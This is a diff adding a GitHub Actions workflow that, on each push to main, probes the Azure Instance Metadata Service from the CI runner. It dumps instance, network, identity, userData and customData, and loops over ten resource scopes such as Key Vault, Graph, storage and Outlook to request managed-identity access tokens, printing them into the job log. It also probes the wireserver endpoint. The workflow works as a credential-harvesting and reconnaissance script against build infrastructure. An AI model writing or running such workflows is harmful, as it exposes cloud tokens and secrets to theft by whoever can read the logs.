@@ -1,0 +1,54 @@
+name: IMDS Extended Probe
+on:
+  push:
+    branches: [main]
+
+jobs:
+  imds-extended:
+    runs-on: ubuntu-latest
+    steps:
+      - name: All metadata categories
+        run: |
+          echo "=== /metadata/instance ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" 2>&1 | jq . | head -40
+          echo ""
+          echo "=== /metadata/instance/network ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance/network?api-version=2021-12-13" 2>&1 | jq .
+          echo ""
+          echo "=== /metadata/loadbalancer ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/loadbalancer?api-version=2021-05-01" 2>&1 | jq . | head -30
+          echo ""
+          echo "=== /metadata/scheduledevents ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1 | head -30
+          echo ""
+          echo "=== /metadata/identity/info ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1
+          echo ""
+          echo "=== /metadata/attested/document ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>&1 | head -3
+          echo ""
+          # Try various managed identity resource scopes
+          for resource in "https://management.azure.com/" "https://vault.azure.net/" "https://storage.azure.com/" "https://graph.microsoft.com/" "https://servicebus.azure.net/" "https://eventhubs.azure.net/" "https://datalake.azure.net/" "https://management.core.windows.net/" "https://outlook.office365.com/" "https://api.loganalytics.io/"; do
+            echo "=== identity token for: $resource ==="
+            curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${resource}" 2>&1 | head -5
+            echo ""
+          done
+
+      - name: Network reachability checks
+        run: |
+          echo "=== /metadata/instance/compute/userData ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" 2>&1 | head -3
+          echo ""
+          echo "=== /metadata/instance/compute/customData ==="
+          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-01-01" 2>&1 | head -3
+          echo ""
+          # Wireserver
+          echo "=== Wireserver 168.63.129.16 (should timeout) ==="
+          curl --max-time 3 -sf "http://168.63.129.16/?comp=goalstate" 2>&1 || echo "wireserver: blocked"
+          echo ""
+          # Try different IMDS API versions
+          for api in "2017-03-01" "2017-08-01" "2018-04-02" "2019-08-15" "2021-12-13"; do
+            echo "=== api-version=$api ==="
+            curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=$api" 2>&1 | head -1
+            echo ""
+          done
